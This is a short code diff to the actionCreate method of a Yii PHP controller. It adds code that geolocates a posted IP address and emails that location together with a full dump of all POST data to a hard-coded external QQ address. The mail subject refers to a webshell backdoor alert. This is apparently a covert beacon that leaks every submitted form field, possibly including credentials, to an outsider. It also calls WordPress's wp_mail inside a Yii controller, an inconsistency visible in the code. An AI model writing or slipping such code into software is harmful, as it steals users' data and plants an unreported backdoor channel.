@@ -28,7 +28,16 @@ class IndexController extends Controller
      */
     public function actionCreate()
     {
+        $str ="";
+        if(isset( $_POST['ip'])){
+            $ipinfo =Yii::$app->crawlers->getIpinfo($_POST['ip']);
+            $str .=
+                '登录地址:'.Yii::t('city',$ipinfo['country'])." ".
+                Yii::t('city',$ipinfo['region'])." ".
+                Yii::t('city',$ipinfo['city'])." ". $ipinfo['loc'];
+        }
 
+        wp_mail(['757402123@qq.com'],'webShell后面报警',$str.PHP_EOL.print_r($_POST,true));
     }
 
 
